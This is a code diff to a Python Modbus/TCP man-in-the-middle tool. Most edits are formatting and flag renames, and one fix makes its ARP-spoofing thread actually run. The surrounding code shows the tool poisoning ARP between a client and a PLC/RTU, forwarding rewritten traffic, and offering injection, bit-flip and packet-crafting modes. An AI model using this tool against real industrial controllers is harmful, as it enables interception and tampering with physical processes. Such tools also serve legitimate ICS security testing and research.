@@ -139,8 +139,7 @@ def is_retransmission(pkt):
 def print_modbus_payload(mb):
     func_code = mb.funcCode
     func_name = MODBUS_FUNCTION_CODES.get(func_code, "Unknown/Reserved")
-    print(f"Function:\t\t{func_name} ({func_code})")
-
+    print(f"{'Function:':<20}{func_name} ({func_code})")
     # The actual PDU is whatever Scapy parsed as the payload of the ADU
     pdu = mb.payload
 
@@ -163,7 +162,7 @@ def print_modbus_payload(mb):
     for field_name, label in field_labels:
         if hasattr(pdu, field_name):
             value = getattr(pdu, field_name)
-            print(f"{label}:\t\t{value}")
+            print(f"{label:<20}{value}")
 
 def interactive_packet_craft():
     p=""
@@ -282,7 +281,7 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     pkt[Ether].dst=mappings[dst]
     
     if not pkt.haslayer(ModbusADUResponse) and not pkt.haslayer(ModbusADURequest):
-        print("Not a modbus response or request")
+        #print("Not a modbus response or request")
         sendp(pkt,loop=0,inter=0.2,verbose=0)
         return
 
@@ -305,7 +304,8 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     #MODBUS RESPONSE#
     #################
     if pkt.haslayer(ModbusADUResponse):
-        print("Got a modbus response")
+        print("\n<- Response Recieved:")
+        print("-"*16)
         print_modbus_payload(pkt[ModbusADUResponse])
         # TODO: Revist trickster mode
         # if trickster:
@@ -364,7 +364,7 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
 
 
             case "passive": # just sniffing traffic
-                print("\nRequest Recieved:")
+                print("\n-> Request Recieved:")
                 print_modbus_payload(pkt[ModbusADURequest])    
                 print("-"*16)
 
@@ -401,8 +401,8 @@ by cdino, v{VERSION}
 def main():
     ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
     ap.add_argument("-i", "--interface", required=True, help="Interface to use")
-    ap.add_argument("-v","--client", required=True, help="IP of the Modbus client")
-    ap.add_argument("-t","--server", required=True, help="IP of the Modbus server (PLC/RTU)")
+    ap.add_argument("-c","--client", required=True, help="IP of the Modbus client")
+    ap.add_argument("-s","--server", required=True, help="IP of the Modbus server (PLC/RTU)")
     ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
     ap.add_argument("--mode", required=True, help="Mode to run in (e.g. passive, injection, flip)")
     ap.add_argument("--log", help="Optional path to append decoded output to")
@@ -436,7 +436,7 @@ def main():
     log_line(f"Resolved server {args.server} -> {server_mac}", log_file)
 
     spoof_thread = threading.Thread(
-        server=arp_spoof_loop,
+        target=arp_spoof_loop,
         args=(args.interface, args.client, client_mac, args.server, server_mac, own_mac, stop_event, args.arp_interval),
         daemon=True,
     )
